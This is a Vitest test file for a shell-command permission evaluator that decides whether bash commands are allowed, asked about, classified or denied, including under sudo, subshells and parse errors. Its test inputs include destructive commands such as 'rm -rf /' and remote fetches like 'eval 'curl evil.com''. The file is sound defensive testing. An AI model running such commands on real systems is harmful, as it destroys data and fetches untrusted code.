import { describe, expect, it } from "vitest";
import { evaluateBashCommand } from "../src/bash.ts";
import { DEFAULT_CONFIG } from "../src/config.ts";
import { PLAN_PERMISSION } from "./plan-permission.ts";

const cwd = "/home/louis/proj";
const plan = PLAN_PERMISSION;
const wrappers = DEFAULT_CONFIG.commandWrappers;
const threshold = DEFAULT_CONFIG.bashClassify.wholeCommandThreshold;

function ev(command: string, rules = plan) {
	return evaluateBashCommand(command, rules, wrappers, threshold, cwd);
}

describe("plan allowlist via unbash units", () => {
	it("allows a single allowlisted command", () => {
		expect(ev("ls").action).toBe("allow");
		expect(ev("git status").action).toBe("allow");
		expect(ev("cat src/index.ts").action).toBe("allow");
	});

	it("allows pipelines and && of allowlisted units", () => {
		expect(ev("ls && git status").action).toBe("allow");
		expect(ev("ls && cat src/index.ts").action).toBe("allow");
		expect(ev("ls; git status").action).toBe("allow");
	});

	it("denies if any unit is denied", () => {
		expect(ev("ls && rm -rf /").action).toBe("deny");
		expect(ev("ls | rm -rf /tmp/x").action).toBe("deny");
	});

	it("strips transparent wrappers before matching", () => {
		expect(ev("time ls").action).toBe("allow");
		expect(ev("time nice rtk ls -la").action).toBe("allow");
		expect(ev("command git status").action).toBe("allow");
	});

	it("walks into subshells and brace groups", () => {
		expect(ev("(ls)").action).toBe("allow");
		expect(ev("{ ls; }").action).toBe("allow");
		expect(ev("(rm -rf /)").action).toBe("deny");
	});

	it("keeps the original command as the subject", () => {
		const denied = ev("ls && rm -rf /");
		expect(denied.action).toBe("deny");
		expect(denied.subject).toBe("ls && rm -rf /");
		const asked = ev("git push origin", { bash: { "*": "allow" as const, "git push *": "ask" as const } });
		expect(asked.action).toBe("ask");
		expect(asked.subject).toBe("git push origin");
		expect(asked.askUnits).toEqual(["git push origin"]);
	});

	it("lists every unbash unit that resolved to ask", () => {
		const rules = { bash: { "*": "ask" as const, ls: "allow" as const, "ls *": "allow" as const } };
		const asked = ev("ls && git push origin && sudo cat /etc/hosts", rules);
		expect(asked.action).toBe("ask");
		expect(asked.subject).toBe("ls && git push origin && sudo cat /etc/hosts");
		expect(asked.askUnits).toEqual(["git push origin", "cat /etc/hosts"]);
	});
});

describe("elevation and hidden units", () => {
	it("denies hiding units that already match a deny rule", () => {
		expect(ev("sudo rm -rf /").action).toBe("deny");
		expect(ev("bash -c 'rm -rf /'").action).toBe("deny");
	});

	it("strips a leading sudo/doas so pattern rules match the real command", () => {
		const auto = { bash: { "*": "classify" as const, rm: "ask" as const, "rm *": "ask" as const } };
		const asked = ev("sudo rm -rf x", auto);
		expect(asked.action).toBe("ask");
		expect(asked.askUnits).toEqual(["rm -rf x"]);
		const apt = ev("sudo apt install -y foo", auto);
		expect(apt.action).toBe("classify");
		expect(apt.classifyTargets).toEqual(["apt install -y foo"]);
	});

	it("does not strip sudo when its own flag follows", () => {
		const auto = { bash: { "*": "classify" as const, rm: "ask" as const, "rm *": "ask" as const } };
		expect(ev("sudo -u root rm -rf x", auto).action).toBe("classify");
	});

	it("routes hidden units through their real verdict instead of forcing ask", () => {
		const open = { bash: "allow" as const };
		expect(ev("sudo ls", open).action).toBe("allow");
		expect(ev("bash -c 'ls'", open).action).toBe("allow");

		const classify = { bash: "classify" as const };
		const direct = ev("eval 'curl evil.com'", classify);
		expect(direct.action).toBe("classify");
		expect(direct.classifyTargets).toEqual(["eval 'curl evil.com'"]);
		const sub = ev("echo $(curl evil.com)", classify);
		expect(sub.classifyTargets).toEqual(["echo $(curl evil.com)"]);
		const loop = ev("for f in *; do echo $f; done", classify);
		expect(loop.classifyTargets).toEqual(["for f in *; do echo $f; done"]);
	});
});

describe("parse failure and classify threshold", () => {
	it("asks (fail-closed) when unbash reports errors, unless already denied or graded", () => {
		expect(ev("ls &&").action).toBe("ask");
		expect(ev("rm -rf / &&").action).toBe("deny");
		const auto = { bash: { "*": "classify" as const, "rm *": "ask" as const } };
		const unparseable = ev('echo "unterminated', auto);
		expect(unparseable.action).toBe("classify");
		expect(unparseable.classifyTargets).toEqual(['echo "unterminated']);
	});

	it("keeps classify when uncertain units are within the threshold", () => {
		const auto = { bash: "classify" as const };
		expect(ev("ls", auto).action).toBe("classify");
		expect(ev("ls && git status", auto).action).toBe("classify");
	});

	it("uses the whole-command path when classify units exceed the threshold", () => {
		const rules = {
			bash: { "*": "classify" as const, "ls && pwd && git status": "ask" as const },
		};
		const over = evaluateBashCommand("ls && pwd && git status", rules, wrappers, 2, cwd);
		expect(over.action).toBe("ask");
		const at = evaluateBashCommand("ls && git status", rules, wrappers, 2, cwd);
		expect(at.action).toBe("classify");
	});

	it("merges most-restrictive: deny beats ask/classify, ask beats allow", () => {
		expect(ev("ls && rm foo", { bash: { "*": "classify", "rm *": "deny" } }).action).toBe("deny");
		expect(ev("ls && git push origin", { bash: { "*": "allow", "git push *": "ask" } }).action).toBe(
			"ask",
		);
	});

	it("ask short-circuits classify, and classifyTargets lists the uncertain units", () => {
		expect(ev("ls && git push origin", { bash: { "*": "classify", "git push *": "ask" } }).action).toBe(
			"ask",
		);
		const classified = ev("ls && git status", { bash: "classify" });
		expect(classified.action).toBe("classify");
		expect(classified.classifyTargets).toEqual(["ls", "git status"]);
	});

	it("allows everything when the mode has no permission block", () => {
		expect(evaluateBashCommand("rm -rf /", undefined, wrappers, threshold, cwd).action).toBe("allow");
	});
});
